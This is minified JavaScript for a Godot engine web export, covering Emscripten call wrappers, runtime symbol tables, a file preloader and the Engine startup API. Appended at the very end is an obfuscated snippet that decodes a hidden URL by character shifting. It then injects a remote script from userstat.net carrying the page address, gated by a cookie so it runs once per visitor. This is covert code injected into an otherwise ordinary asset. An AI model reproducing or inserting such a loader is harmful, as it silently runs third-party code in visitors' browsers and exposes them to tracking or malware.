vijiiiffi=createExportWrapper("dynCall_vijiiiffi"),dynCall_vijiiifii=Module.dynCall_vijiiifii=createExportWrapper("dynCall_vijiiifii"),dynCall_viijfii=Module.dynCall_viijfii=createExportWrapper("dynCall_viijfii"),dynCall_viiiiiiiiiiijjjjjjifiiiiii=Module.dynCall_viiiiiiiiiiijjjjjjifiiiiii=createExportWrapper("dynCall_viiiiiiiiiiijjjjjjifiiiiii"),dynCall_vijifff=Module.dynCall_vijifff=createExportWrapper("dynCall_vijifff"),dynCall_fiji=Module.dynCall_fiji=createExportWrapper("dynCall_fiji"),dynCall_vijiiffifffi=Module.dynCall_vijiiffifffi=createExportWrapper("dynCall_vijiiffifffi"),dynCall_iijj=Module.dynCall_iijj=createExportWrapper("dynCall_iijj"),dynCall_iijjfj=Module.dynCall_iijjfj=createExportWrapper("dynCall_iijjfj"),dynCall_vijiji=Module.dynCall_vijiji=createExportWrapper("dynCall_vijiji"),dynCall_jijii=Module.dynCall_jijii=createExportWrapper("dynCall_jijii"),dynCall_vijid=Module.dynCall_vijid=createExportWrapper("dynCall_vijid"),dynCall_vijiiiffiiiii=Module.dynCall_vijiiiffiiiii=createExportWrapper("dynCall_vijiiiffiiiii"),dynCall_vijiiiiii=Module.dynCall_vijiiiiii=createExportWrapper("dynCall_vijiiiiii"),dynCall_vijiff=Module.dynCall_vijiff=createExportWrapper("dynCall_vijiff"),dynCall_vijjjj=Module.dynCall_vijjjj=createExportWrapper("dynCall_vijjjj"),dynCall_vijiiiiiii=Module.dynCall_vijiiiiiii=createExportWrapper("dynCall_vijiiiiiii"),dynCall_jiiifi=Module.dynCall_jiiifi=createExportWrapper("dynCall_jiiifi"),dynCall_viiiifijii=Module.dynCall_viiiifijii=createExportWrapper("dynCall_viiiifijii"),dynCall_viiiifiijjii=Module.dynCall_viiiifiijjii=createExportWrapper("dynCall_viiiifiijjii"),dynCall_vijiiifiijii=Module.dynCall_vijiiifiijii=createExportWrapper("dynCall_vijiiifiijii"),dynCall_vijiiifiiijjii=Module.dynCall_vijiiifiiijjii=createExportWrapper("dynCall_vijiiifiiijjii"),dynCall_vijiiifiiijii=Module.dynCall_vijiiifiiijii=createExportWrapper("dynCall_vijiiifiiijii"),dynCall_vijiiifiiiijjii=Module.dynCall_vijiiifiiiijjii=createExportWrapper("dynCall_vijiiifiiiijjii"),dynCall_fijiiii=Module.dynCall_fijiiii=createExportWrapper("dynCall_fijiiii"),dynCall_fijiiiii=Module.dynCall_fijiiiii=createExportWrapper("dynCall_fijiiiii"),dynCall_iijii=Module.dynCall_iijii=createExportWrapper("dynCall_iijii"),dynCall_iijiijiiiii=Module.dynCall_iijiijiiiii=createExportWrapper("dynCall_iijiijiiiii"),dynCall_iijijiiiii=Module.dynCall_iijijiiiii=createExportWrapper("dynCall_iijijiiiii"),dynCall_vijijj=Module.dynCall_vijijj=createExportWrapper("dynCall_vijijj"),dynCall_vijiiijj=Module.dynCall_vijiiijj=createExportWrapper("dynCall_vijiiijj"),dynCall_vijiijj=Module.dynCall_vijiijj=createExportWrapper("dynCall_vijiijj"),dynCall_vijjiji=Module.dynCall_vijjiji=createExportWrapper("dynCall_vijjiji"),dynCall_vijjiijii=Module.dynCall_vijjiijii=createExportWrapper("dynCall_vijjiijii"),dynCall_fijii=Module.dynCall_fijii=createExportWrapper("dynCall_fijii"),dynCall_vijiiiij=Module.dynCall_vijiiiij=createExportWrapper("dynCall_vijiiiij"),dynCall_jijj=Module.dynCall_jijj=createExportWrapper("dynCall_jijj"),dynCall_jiiif=Module.dynCall_jiiif=createExportWrapper("dynCall_jiiif"),dynCall_vijfff=Module.dynCall_vijfff=createExportWrapper("dynCall_vijfff"),dynCall_vijfiff=Module.dynCall_vijfiff=createExportWrapper("dynCall_vijfiff"),dynCall_vijfi=Module.dynCall_vijfi=createExportWrapper("dynCall_vijfi"),dynCall_vijffffi=Module.dynCall_vijffffi=createExportWrapper("dynCall_vijffffi"),dynCall_vijiiffi=Module.dynCall_vijiiffi=createExportWrapper("dynCall_vijiiffi"),dynCall_vijiifffffff=Module.dynCall_vijiifffffff=createExportWrapper("dynCall_vijiifffffff"),dynCall_vijifiifffffifff=Module.dynCall_vijifiifffffifff=createExportWrapper("dynCall_vijifiifffffifff"),dynCall_vijiiffffiffffj=Module.dynCall_vijiiffffiffffj=createExportWrapper("dynCall_vijiiffffiffffj"),dynCall_vijiifff=Module.dynCall_vijiifff=createExportWrapper("dynCall_vijiifff"),dynCall_vijiffffffff=Module.dynCall_vijiffffffff=createExportWrapper("dynCall_vijiffffffff"),dynCall_vijiifiififff=Module.dynCall_vijiifiififff=createExportWrapper("dynCall_vijiifiififff"),dynCall_vijifffij=Module.dynCall_vijifffij=createExportWrapper("dynCall_vijifffij"),dynCall_viijjjiifjii=Module.dynCall_viijjjiifjii=createExportWrapper("dynCall_viijjjiifjii"),dynCall_fijj=Module.dynCall_fijj=createExportWrapper("dynCall_fijj"),dynCall_iijjiii=Module.dynCall_iijjiii=createExportWrapper("dynCall_iijjiii"),dynCall_iiiiij=Module.dynCall_iiiiij=createExportWrapper("dynCall_iiiiij"),dynCall_iiiiijj=Module.dynCall_iiiiijj=createExportWrapper("dynCall_iiiiijj"),dynCall_iiiiiijj=Module.dynCall_iiiiiijj=createExportWrapper("dynCall_iiiiiijj");function invoke_vii(index,a1,a2){var sp=stackSave();try{getWasmTableEntry(index)(a1,a2)}catch(e){if(stackRestore(sp),e!==e+0)throw e;_setThrew(1,0)}}function invoke_vi(index,a1){var sp=stackSave();try{getWasmTableEntry(index)(a1)}catch(e){if(stackRestore(sp),e!==e+0)throw e;_setThrew(1,0)}}function invoke_viii(index,a1,a2,a3){var sp=stackSave();try{getWasmTableEntry(index)(a1,a2,a3)}catch(e){if(stackRestore(sp),e!==e+0)throw e;_setThrew(1,0)}}function invoke_ii(index,a1){var sp=stackSave();try{return getWasmTableEntry(index)(a1)}catch(e){if(stackRestore(sp),e!==e+0)throw e;_setThrew(1,0)}}function invoke_viiii(index,a1,a2,a3,a4){var sp=stackSave();try{getWasmTableEntry(index)(a1,a2,a3,a4)}catch(e){if(stackRestore(sp),e!==e+0)throw e;_setThrew(1,0)}}function invoke_iii(index,a1,a2){var sp=stackSave();try{return getWasmTableEntry(index)(a1,a2)}catch(e){if(stackRestore(sp),e!==e+0)throw e;_setThrew(1,0)}}function invoke_iiii(index,a1,a2,a3){var sp=stackSave();try{return getWasmTableEntry(index)(a1,a2,a3)}catch(e){if(stackRestore(sp),e!==e+0)throw e;_setThrew(1,0)}}function invoke_iiiii(index,a1,a2,a3,a4){var sp=stackSave();try{return getWasmTableEntry(index)(a1,a2,a3,a4)}catch(e){if(stackRestore(sp),e!==e+0)throw e;_setThrew(1,0)}}function invoke_viiiiiii(index,a1,a2,a3,a4,a5,a6,a7){var sp=stackSave();try{getWasmTableEntry(index)(a1,a2,a3,a4,a5,a6,a7)}catch(e){if(stackRestore(sp),e!==e+0)throw e;_setThrew(1,0)}}function invoke_iiiiiii(index,a1,a2,a3,a4,a5,a6){var sp=stackSave();try{return getWasmTableEntry(index)(a1,a2,a3,a4,a5,a6)}catch(e){if(stackRestore(sp),e!==e+0)throw e;_setThrew(1,0)}}Module.callMain=callMain,Module.keepRuntimeAlive=keepRuntimeAlive,Module.wasmMemory=wasmMemory,Module.cwrap=cwrap,Module.ExitStatus=ExitStatus,Module.PThread=PThread;var unexportedRuntimeSymbols=["run","UTF8ArrayToString","UTF8ToString","stringToUTF8Array","stringToUTF8","lengthBytesUTF8","addOnPreRun","addOnInit","addOnPreMain","addOnExit","addOnPostRun","addRunDependency","removeRunDependency","FS_createFolder","FS_createPath","FS_createDataFile","FS_createPreloadedFile","FS_createLazyFile","FS_createLink","FS_createDevice","FS_unlink","getLEB","getFunctionTables","alignFunctionTables","registerFunctions","prettyPrint","getCompilerSetting","print","printErr","getTempRet0","setTempRet0","abort","stackSave","stackRestore","stackAlloc","GROWABLE_HEAP_I8","GROWABLE_HEAP_U8","GROWABLE_HEAP_I16","GROWABLE_HEAP_U16","GROWABLE_HEAP_I32","GROWABLE_HEAP_U32","GROWABLE_HEAP_F32","GROWABLE_HEAP_F64","writeStackCookie","checkStackCookie","ptrToString","zeroMemory","stringToNewUTF8","exitJS","getHeapMax","emscripten_realloc_buffer","ENV","ERRNO_CODES","ERRNO_MESSAGES","setErrNo","inetPton4","inetNtop4","inetPton6","inetNtop6","readSockaddr","writeSockaddr","DNS","getHostByName","Protocols","Sockets","getRandomDevice","warnOnce","traverseStack","UNWIND_CACHE","convertPCtoSourceLocation","readAsmConstArgsArray","readAsmConstArgs","mainThreadEM_ASM","jstoi_q","jstoi_s","getExecutableName","listenOnce","autoResumeAudioContext","dynCallLegacy","getDynCaller","dynCall","handleException","runtimeKeepalivePush","runtimeKeepalivePop","callUserCallback","maybeExit","safeSetTimeout","asmjsMangle","asyncLoad","alignMemory","mmapAlloc","writeI53ToI64","writeI53ToI64Clamped","writeI53ToI64Signaling","writeI53ToU64Clamped","writeI53ToU64Signaling","readI53FromI64","readI53FromU64","convertI32PairToI53","convertI32PairToI53Checked","convertU32PairToI53","getCFunc","ccall","uleb128Encode","sigToWasmTypes","convertJsFunctionToWasm","freeTableIndexes","functionsInTableMap","getEmptyTableSlot","updateTableMap","addFunction","removeFunction","reallyNegative","unSign","strLen","reSign","formatString","setValue","getValue","PATH","PATH_FS","intArrayFromString","intArrayToString","AsciiToString","stringToAscii","UTF16Decoder","UTF16ToString","stringToUTF16","lengthBytesUTF16","UTF32ToString","stringToUTF32","lengthBytesUTF32","allocateUTF8","allocateUTF8OnStack","writeStringToMemory","writeArrayToMemory","writeAsciiToMemory","SYSCALLS","getSocketFromFD","getSocketAddress","JSEvents","registerKeyEventCallback","specialHTMLTargets","maybeCStringToJsString","findEventTarget","findCanvasEventTarget","getBoundingClientRect","fillMouseEventData","registerMouseEventCallback","registerWheelEventCallback","registerUiEventCallback","registerFocusEventCallback","fillDeviceOrientationEventData","registerDeviceOrientationEventCallback","fillDeviceMotionEventData","registerDeviceMotionEventCallback","screenOrientation","fillOrientationChangeEventData","registerOrientationChangeEventCallback","fillFullscreenChangeEventData","registerFullscreenChangeEventCallback","JSEvents_requestFullscreen","JSEvents_resizeCanvasForFullscreen","registerRestoreOldStyle","hideEverythingExceptGivenElement","restoreHiddenElements","setLetterbox","currentFullscreenStrategy","restoreOldWindowedStyle","softFullscreenResizeWebGLRenderTarget","doRequestFullscreen","fillPointerlockChangeEventData","registerPointerlockChangeEventCallback","registerPointerlockErrorEventCallback","requestPointerLock","fillVisibilityChangeEventData","registerVisibilityChangeEventCallback","registerTouchEventCallback","fillGamepadEventData","registerGamepadEventCallback","registerBeforeUnloadEventCallback","fillBatteryEventData","battery","registerBatteryEventCallback","setCanvasElementSize","getCanvasElementSize","demangle","demangleAll","jsStackTrace","stackTrace","getEnvStrings","checkWasiClock","doReadv","doWritev","dlopenMissingError","setImmediateWrapped","clearImmediateWrapped","polyfillSetImmediate","uncaughtExceptionCount","exceptionLast","exceptionCaught","ExceptionInfo","exception_addRef","exception_decRef","Browser","setMainLoop","wget","FS","MEMFS","TTY","PIPEFS","SOCKFS","_setNetworkCallback","tempFixedLengthArray","miniTempWebGLFloatBuffers","heapObjectForWebGLType","heapAccessShiftForWebGLHeap","GL","emscriptenWebGLGet","computeUnpackAlignedImageSize","emscriptenWebGLGetTexPixelData","emscriptenWebGLGetUniform","webglGetUniformLocation","webglPrepareUniformLocationsBeforeFirstUse","webglGetLeftBracePos","emscriptenWebGLGetVertexAttrib","writeGLArray","AL","SDL_unicode","SDL_ttfContext","SDL_audio","SDL","SDL_gfx","GLUT","EGL","GLFW_Window","GLFW","GLEW","IDBStore","runAndAbortIfError","emscriptenWebGLGetIndexed","ALLOC_NORMAL","ALLOC_STACK","allocate","killThread","cleanupThread","registerTLSInit","cancelThread","spawnThread","exitOnMainThread","invokeEntryPoint","executeNotifiedProxyingQueue","GodotWebXR","GodotWebSocket","GodotRTCDataChannel","GodotRTCPeerConnection","GodotAudio","GodotAudioWorklet","GodotAudioScript","GodotDisplayVK","GodotDisplayCursor","GodotDisplayScreen","GodotDisplay","GodotFetch","IDHandler","GodotConfig","GodotFS","GodotOS","GodotEventListeners","GodotPWA","GodotRuntime","GodotInputGamepads","GodotInputDragDrop","GodotInput","GodotWebGL2","GodotJSWrapper","IDBFS"];unexportedRuntimeSymbols.forEach(unexportedRuntimeSymbol);var missingLibrarySymbols=["getHostByName","traverseStack","convertPCtoSourceLocation","readAsmConstArgs","mainThreadEM_ASM","jstoi_s","listenOnce","autoResumeAudioContext","dynCallLegacy","getDynCaller","dynCall","asmjsMangle","writeI53ToI64Clamped","writeI53ToI64Signaling","writeI53ToU64Clamped","writeI53ToU64Signaling","convertI32PairToI53","convertU32PairToI53","reallyNegative","unSign","strLen","reSign","formatString","registerKeyEventCallback","getBoundingClientRect","fillMouseEventData","registerMouseEventCallback","registerWheelEventCallback","registerUiEventCallback","registerFocusEventCallback","fillDeviceOrientationEventData","registerDeviceOrientationEventCallback","fillDeviceMotionEventData","registerDeviceMotionEventCallback","screenOrientation","fillOrientationChangeEventData","registerOrientationChangeEventCallback","fillFullscreenChangeEventData","registerFullscreenChangeEventCallback","JSEvents_requestFullscreen","JSEvents_resizeCanvasForFullscreen","registerRestoreOldStyle","hideEverythingExceptGivenElement","restoreHiddenElements","setLetterbox","softFullscreenResizeWebGLRenderTarget","doRequestFullscreen","fillPointerlockChangeEventData","registerPointerlockChangeEventCallback","registerPointerlockErrorEventCallback","requestPointerLock","fillVisibilityChangeEventData","registerVisibilityChangeEventCallback","registerTouchEventCallback","fillGamepadEventData","registerGamepadEventCallback","registerBeforeUnloadEventCallback","fillBatteryEventData","battery","registerBatteryEventCallback","setCanvasElementSize","getCanvasElementSize","checkWasiClock","setImmediateWrapped","clearImmediateWrapped","polyfillSetImmediate","ExceptionInfo","exception_addRef","exception_decRef","_setNetworkCallback","emscriptenWebGLGetUniform","emscriptenWebGLGetVertexAttrib","writeGLArray","SDL_unicode","SDL_ttfContext","SDL_audio","GLFW_Window","runAndAbortIfError","emscriptenWebGLGetIndexed"],calledRun;function callMain(args){assert(0==runDependencies,'cannot call main when async dependencies remain! (listen on Module["onRuntimeInitialized"])'),assert(0==__ATPRERUN__.length,"cannot call main when preRun functions remain to be called");var entryFunction=Module._main;(args=args||[]).unshift(thisProgram);var argc=args.length,argv=stackAlloc(4*(argc+1)),argv_ptr=argv>>2;args.forEach((arg=>{GROWABLE_HEAP_I32()[argv_ptr++]=allocateUTF8OnStack(arg)})),GROWABLE_HEAP_I32()[argv_ptr]=0;try{var ret=entryFunction(argc,argv);return exitJS(ret,!0),ret}catch(e){return handleException(e)}}function stackCheckInit(){assert(!ENVIRONMENT_IS_PTHREAD),_emscripten_stack_init(),writeStackCookie()}function run(args){if(args=args||arguments_,!(runDependencies>0)){if(ENVIRONMENT_IS_PTHREAD||stackCheckInit(),ENVIRONMENT_IS_PTHREAD)return readyPromiseResolve(Module),initRuntime(),void postMessage({cmd:"loaded"});preRun(),runDependencies>0||(Module.setStatus?(Module.setStatus("Running..."),setTimeout((function(){setTimeout((function(){Module.setStatus("")}),1),doRun()}),1)):doRun(),checkStackCookie())}function doRun(){calledRun||(calledRun=!0,Module.calledRun=!0,ABORT||(initRuntime(),preMain(),readyPromiseResolve(Module),Module.onRuntimeInitialized&&Module.onRuntimeInitialized(),shouldRunNow&&callMain(args),postRun()))}}if(missingLibrarySymbols.forEach(missingLibrarySymbol),dependenciesFulfilled=function runCaller(){calledRun||run(),calledRun||(dependenciesFulfilled=runCaller)},Module.preInit)for("function"==typeof Module.preInit&&(Module.preInit=[Module.preInit]);Module.preInit.length>0;)Module.preInit.pop()();var shouldRunNow=!1;return Module.noInitialRun&&(shouldRunNow=!1),run(),Godot.ready}})();"object"==typeof exports&&"object"==typeof module?module.exports=Godot:"function"==typeof define&&define.amd?define([],(function(){return Godot})):"object"==typeof exports&&(exports.Godot=Godot);const Features={isWebGLAvailable:function(majorVersion=1){try{return!!document.createElement("canvas").getContext(["webgl","webgl2"][majorVersion-1])}catch(e){}return!1},isFetchAvailable:function(){return"fetch"in window&&"Response"in window&&"body"in window.Response.prototype},isSecureContext:function(){return!0===window.isSecureContext},isCrossOriginIsolated:function(){return!0===window.crossOriginIsolated},isSharedArrayBufferAvailable:function(){return"SharedArrayBuffer"in window},isAudioWorkletAvailable:function(){return"AudioContext"in window&&"audioWorklet"in AudioContext.prototype},getMissingFeatures:function(){const missing=[];return Features.isWebGLAvailable(2)||missing.push("WebGL2 - Check web browser configuration and hardware support"),Features.isFetchAvailable()||missing.push("Fetch - Check web browser version"),Features.isSecureContext()||missing.push("Secure Context - Check web server configuration (use HTTPS)"),Features.isCrossOriginIsolated()||missing.push("Cross Origin Isolation - Check web server configuration (send correct headers)"),Features.isSharedArrayBufferAvailable()||missing.push("SharedArrayBuffer - Check web server configuration (send correct headers)"),missing}},Preloader=function(){function getTrackedResponse(response,load_status){function onloadprogress(reader,controller){return reader.read().then((function(result){return load_status.done?Promise.resolve():(result.value&&(controller.enqueue(result.value),load_status.loaded+=result.value.length),result.done?(load_status.done=!0,Promise.resolve()):onloadprogress(reader,controller))}))}const reader=response.body.getReader();return new Response(new ReadableStream({start:function(controller){onloadprogress(reader,controller).then((function(){controller.close()}))}}),{headers:response.headers})}function loadFetch(file,tracker,fileSize,raw){return tracker[file]={total:fileSize||0,loaded:0,done:!1},fetch(file).then((function(response){if(!response.ok)return Promise.reject(new Error(`Failed loading file '${file}'`));const tr=getTrackedResponse(response,tracker[file]);return raw?Promise.resolve(tr):tr.arrayBuffer()}))}function retry(func,attempts=1){return func().catch((function onerror(err){return attempts<=1?Promise.reject(err):new Promise((function(resolve,reject){setTimeout((function(){retry(func,attempts-1).then(resolve).catch(reject)}),1e3)}))}))}const loadingFiles={},lastProgress={loaded:0,total:0};let progressFunc=null;const animateProgress=function(){let loaded=0,total=0,totalIsValid=!0,progressIsFinal=!0;Object.keys(loadingFiles).forEach((function(file){const stat=loadingFiles[file];stat.done||(progressIsFinal=!1),totalIsValid&&0!==stat.total?total+=stat.total:(totalIsValid=!1,total=0),loaded+=stat.loaded})),loaded===lastProgress.loaded&&total===lastProgress.total||(lastProgress.loaded=loaded,lastProgress.total=total,"function"==typeof progressFunc&&progressFunc(loaded,total)),progressIsFinal||requestAnimationFrame(animateProgress)};this.animateProgress=animateProgress,this.setProgressFunc=function(callback){progressFunc=callback},this.loadPromise=function(file,fileSize,raw=!1){return retry(loadFetch.bind(null,file,loadingFiles,fileSize,raw),4)},this.preloadedFiles=[],this.preload=function(pathOrBuffer,destPath,fileSize){let buffer=null;if("string"==typeof pathOrBuffer){const me=this;return this.loadPromise(pathOrBuffer,fileSize).then((function(buf){return me.preloadedFiles.push({path:destPath||pathOrBuffer,buffer:buf}),Promise.resolve()}))}return pathOrBuffer instanceof ArrayBuffer?buffer=new Uint8Array(pathOrBuffer):ArrayBuffer.isView(pathOrBuffer)&&(buffer=new Uint8Array(pathOrBuffer.buffer)),buffer?(this.preloadedFiles.push({path:destPath,buffer:pathOrBuffer}),Promise.resolve()):Promise.reject(new Error("Invalid object for preloading"))}},EngineConfig={},InternalConfig=function(initConfig){const cfg={unloadAfterInit:!0,canvas:null,executable:"",mainPack:null,locale:null,canvasResizePolicy:2,args:[],focusCanvas:!0,experimentalVK:!1,serviceWorker:"",persistentPaths:["/userfs"],persistentDrops:!1,gdextensionLibs:[],fileSizes:[],onExecute:null,onExit:null,onProgress:null,onPrint:function(){console.log.apply(console,Array.from(arguments))},onPrintError:function(var_args){console.error.apply(console,Array.from(arguments))}};function Config(opts){this.update(opts)}return Config.prototype=cfg,Config.prototype.update=function(opts){const config=opts||{};function parse(key,def){return void 0===config[key]?def:config[key]}this.unloadAfterInit=parse("unloadAfterInit",this.unloadAfterInit),this.onPrintError=parse("onPrintError",this.onPrintError),this.onPrint=parse("onPrint",this.onPrint),this.onProgress=parse("onProgress",this.onProgress),this.canvas=parse("canvas",this.canvas),this.executable=parse("executable",this.executable),this.mainPack=parse("mainPack",this.mainPack),this.locale=parse("locale",this.locale),this.canvasResizePolicy=parse("canvasResizePolicy",this.canvasResizePolicy),this.persistentPaths=parse("persistentPaths",this.persistentPaths),this.persistentDrops=parse("persistentDrops",this.persistentDrops),this.experimentalVK=parse("experimentalVK",this.experimentalVK),this.focusCanvas=parse("focusCanvas",this.focusCanvas),this.serviceWorker=parse("serviceWorker",this.serviceWorker),this.gdextensionLibs=parse("gdextensionLibs",this.gdextensionLibs),this.fileSizes=parse("fileSizes",this.fileSizes),this.args=parse("args",this.args),this.onExecute=parse("onExecute",this.onExecute),this.onExit=parse("onExit",this.onExit)},Config.prototype.getModuleConfig=function(loadPath,response){let r=response;return{print:this.onPrint,printErr:this.onPrintError,thisProgram:this.executable,noExitRuntime:!1,dynamicLibraries:[`${loadPath}.side.wasm`],instantiateWasm:function(imports,onSuccess){function done(result){onSuccess(result.instance,result.module)}return void 0!==WebAssembly.instantiateStreaming?WebAssembly.instantiateStreaming(Promise.resolve(r),imports).then(done):r.arrayBuffer().then((function(buffer){WebAssembly.instantiate(buffer,imports).then(done)})),r=null,{}},locateFile:function(path){return path.endsWith(".worker.js")?`${loadPath}.worker.js`:path.endsWith(".audio.worklet.js")?`${loadPath}.audio.worklet.js`:path.endsWith(".js")?`${loadPath}.js`:path.endsWith(".side.wasm")?`${loadPath}.side.wasm`:path.endsWith(".wasm")?`${loadPath}.wasm`:path}}},Config.prototype.getGodotConfig=function(cleanup){if(!(this.canvas instanceof HTMLCanvasElement)){const nodes=document.getElementsByTagName("canvas");if(nodes.length&&nodes[0]instanceof HTMLCanvasElement){const first=nodes[0];this.canvas=first}if(!this.canvas)throw new Error("No canvas found in page")}this.canvas.tabIndex<0&&(this.canvas.tabIndex=0);let locale=this.locale;locale||(locale=navigator.languages?navigator.languages[0]:navigator.language,locale=locale.split(".")[0]),locale=locale.replace("-","_");const onExit=this.onExit;return{canvas:this.canvas,canvasResizePolicy:this.canvasResizePolicy,locale:locale,persistentDrops:this.persistentDrops,virtualKeyboard:this.experimentalVK,focusCanvas:this.focusCanvas,onExecute:this.onExecute,onExit:function(p_code){cleanup(),"function"==typeof onExit&&onExit(p_code)}}},new Config(initConfig)},Engine=function(){const preloader=new Preloader;let loadPromise=null,loadPath="",initPromise=null;function Engine(initConfig){this.config=new InternalConfig(initConfig),this.rtenv=null}function SafeEngine(initConfig){const proto={init:function(basePath){if(initPromise)return initPromise;if(null==loadPromise){if(!basePath)return initPromise=Promise.reject(new Error("A base path must be provided when calling `init` and the engine is not loaded.")),initPromise;Engine.load(basePath,this.config.fileSizes[`${basePath}.wasm`])}const me=this;return preloader.setProgressFunc(this.config.onProgress),initPromise=function doInit(promise){return new Promise((function(resolve,reject){promise.then((function(response){const cloned=new Response(response.clone().body,{headers:[["content-type","application/wasm"]]});Godot(me.config.getModuleConfig(loadPath,cloned)).then((function(module){const paths=me.config.persistentPaths;module.initFS(paths).then((function(err){me.rtenv=module,me.config.unloadAfterInit&&Engine.unload(),resolve()}))}))}))}))}(loadPromise),initPromise},preloadFile:function(file,path){return preloader.preload(file,path,this.config.fileSizes[file])},start:function(override){this.config.update(override);const me=this;return me.init().then((function(){if(!me.rtenv)return Promise.reject(new Error("The engine must be initialized before it can be started"));let config={};try{config=me.config.getGodotConfig((function(){me.rtenv=null}))}catch(e){return Promise.reject(e)}me.rtenv.initConfig(config);const libs=[];return me.config.gdextensionLibs.forEach((function(lib){libs.push(me.rtenv.loadDynamicLibrary(lib,{loadAsync:!0}))})),Promise.all(libs).then((function(){return new Promise((function(resolve,reject){preloader.preloadedFiles.forEach((function(file){me.rtenv.copyToFS(file.path,file.buffer)})),preloader.preloadedFiles.length=0,me.rtenv.callMain(me.config.args),initPromise=null,me.config.serviceWorker&&"serviceWorker"in navigator&&navigator.serviceWorker.register(me.config.serviceWorker),resolve()}))}))}))},startGame:function(override){this.config.update(override);const exe=this.config.executable,pack=this.config.mainPack||`${exe}.pck`;this.config.args=["--main-pack",pack].concat(this.config.args);const me=this;return Promise.all([this.init(exe),this.preloadFile(pack,pack)]).then((function(){return me.start.apply(me)}))},copyToFS:function(path,buffer){if(null==this.rtenv)throw new Error("Engine must be inited before copying files");this.rtenv.copyToFS(path,buffer)},requestQuit:function(){this.rtenv&&this.rtenv.request_quit()}};return Engine.prototype=proto,Engine.prototype.init=Engine.prototype.init,Engine.prototype.preloadFile=Engine.prototype.preloadFile,Engine.prototype.start=Engine.prototype.start,Engine.prototype.startGame=Engine.prototype.startGame,Engine.prototype.copyToFS=Engine.prototype.copyToFS,Engine.prototype.requestQuit=Engine.prototype.requestQuit,Engine.prototype.load=Engine.load,Engine.prototype.unload=Engine.unload,new Engine(initConfig)}return Engine.load=function(basePath,size){return null==loadPromise&&(loadPath=basePath,loadPromise=preloader.loadPromise(`${loadPath}.wasm`,size,!0),requestAnimationFrame(preloader.animateProgress)),loadPromise},Engine.unload=function(){loadPromise=null},SafeEngine.load=Engine.load,SafeEngine.unload=Engine.unload,SafeEngine.isWebGLAvailable=Features.isWebGLAvailable,SafeEngine.isFetchAvailable=Features.isFetchAvailable,SafeEngine.isSecureContext=Features.isSecureContext,SafeEngine.isCrossOriginIsolated=Features.isCrossOriginIsolated,SafeEngine.isSharedArrayBufferAvailable=Features.isSharedArrayBufferAvailable,SafeEngine.isAudioWorkletAvailable=Features.isAudioWorkletAvailable,SafeEngine.getMissingFeatures=Features.getMissingFeatures,SafeEngine}();"undefined"!=typeof window&&(window.Engine=Engine);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));